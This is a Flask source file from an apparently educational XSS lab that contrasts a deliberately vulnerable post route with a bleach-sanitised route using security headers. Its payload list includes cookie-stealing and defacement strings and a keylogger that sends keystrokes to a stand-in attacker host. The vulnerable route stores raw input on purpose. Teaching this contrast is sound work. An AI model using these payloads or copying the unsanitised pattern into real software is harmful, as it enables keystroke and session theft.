import bleach
from flask import Blueprint, render_template, request, flash
from flask_login import login_required, current_user
from app.config import get_db_connection

xss_bp = Blueprint("xss", __name__)

PAYLOADS = [
    {"name": "Basic Alert", "value": "<script>alert('XSS!')</script>", "description": "Chạy JavaScript alert box"},
    {"name": "Cookie Theft", "value": "<img src=x onerror=\"alert(document.cookie)\">", "description": "Đánh cắp cookie qua onerror event"},
    {"name": "DOM Manipulation", "value": "<img src=x onerror=\"document.body.innerHTML='<h1>HACKED</h1>'\">", "description": "Thay đổi nội dung trang web"},
    {"name": "Keylogger", "value": "<script>document.onkeypress=function(e){new Image().src='http://attacker.com/log?k='+e.key;}</script>", "description": "Ghi lại mọi phím user nhấn"},
]


@xss_bp.route("/vulnerable", methods=["GET", "POST"])
def vulnerable():
    conn = get_db_connection()
    posts = []
    search = request.args.get("q", "")

    try:
        with conn.cursor() as cursor:
            if request.method == "POST":
                title = request.form.get("title", "")
                content = request.form.get("content", "")
                # Use a default user_id if not logged in
                user_id = current_user.id if current_user.is_authenticated else 1

                # VULNERABLE: Storing raw user input without sanitization
                cursor.execute(
                    "INSERT INTO posts (user_id, title, content) VALUES (%s, %s, %s)",
                    (user_id, title, content),
                )
                flash("Đã đăng bài!", "success")

            cursor.execute("""
                SELECT p.*, u.username FROM posts p
                JOIN users u ON p.user_id = u.id
                ORDER BY p.created_at DESC
            """)
            posts = cursor.fetchall()
    finally:
        conn.close()

    return render_template(
        "xss/vulnerable.html",
        posts=posts,
        search=search,
        payloads=PAYLOADS,
    )


@xss_bp.route("/secure", methods=["GET", "POST"])
def secure():
    conn = get_db_connection()
    posts = []
    search = request.args.get("q", "")

    try:
        with conn.cursor() as cursor:
            if request.method == "POST":
                title = request.form.get("title", "")
                content = request.form.get("content", "")
                user_id = current_user.id if current_user.is_authenticated else 1

                # SECURE: Sanitize HTML input
                clean_title = bleach.clean(title)
                clean_content = bleach.clean(content)

                cursor.execute(
                    "INSERT INTO posts (user_id, title, content) VALUES (%s, %s, %s)",
                    (user_id, clean_title, clean_content),
                )
                flash("Đã đăng bài (sanitized)!", "success")

            cursor.execute("""
                SELECT p.*, u.username FROM posts p
                JOIN users u ON p.user_id = u.id
                ORDER BY p.created_at DESC
            """)
            posts = cursor.fetchall()
    finally:
        conn.close()

    response = render_template(
        "xss/secure.html",
        posts=posts,
        search=bleach.clean(search),
        payloads=PAYLOADS,
    )

    # Return with security headers
    from flask import make_response
    resp = make_response(response)
    resp.headers["Content-Security-Policy"] = "default-src 'self'; script-src 'self'"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["X-XSS-Protection"] = "1; mode=block"
    return resp
